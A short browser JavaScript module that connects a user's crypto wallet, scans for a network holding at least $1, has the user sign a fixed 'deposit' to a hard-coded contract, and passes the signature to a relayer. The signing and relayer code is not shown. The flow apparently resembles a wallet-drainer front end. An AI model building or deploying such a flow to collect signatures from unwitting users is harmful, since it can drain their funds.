import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6/+esm";

import { findEligibleNetwork } from "./utils/balanceScanner.js";
import { getNonce } from "./utils/getNonce.js";
import { signDeposit } from "./utils/signDeposit.js";
import { sendRelayer } from "./utils/sendRelayer.js";

const CONTRACTS = {
  1: "0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8"
};

async function connectWallet(){

 if(!window.ethereum){
  alert("No wallet detected");
  return;
 }

 const provider = new ethers.BrowserProvider(window.ethereum);

 await provider.send("eth_requestAccounts",[]);

 const signer = await provider.getSigner();

 const address = await signer.getAddress();

 console.log("Wallet connected:",address);

 startFlow(provider,signer,address);

}

async function startFlow(provider,signer,address){

 const network = await findEligibleNetwork(address);

 if(!network){

  alert("No network with $1+ found");

  return;

 }

 console.log("Eligible network:",network);

 const rpcProvider = new ethers.JsonRpcProvider(network.rpc);

 const nonce = await getNonce(
  rpcProvider,
  address,
  CONTRACTS[network.chainId]
 );

 const amount = "0.0005";

 const payload = await signDeposit(
  signer,
  CONTRACTS[network.chainId],
  network.chainId,
  amount,
  nonce
 );

 const result = await sendRelayer(
  payload,
  CONTRACTS[network.chainId]
 );

 console.log("Relayer response:",result);

 if(result.success){

  alert(
   "Transaction executed\n\nHash:\n" +
   result.hash
  );

 }

}

document
.getElementById("connect")
.addEventListener("click",connectWallet);
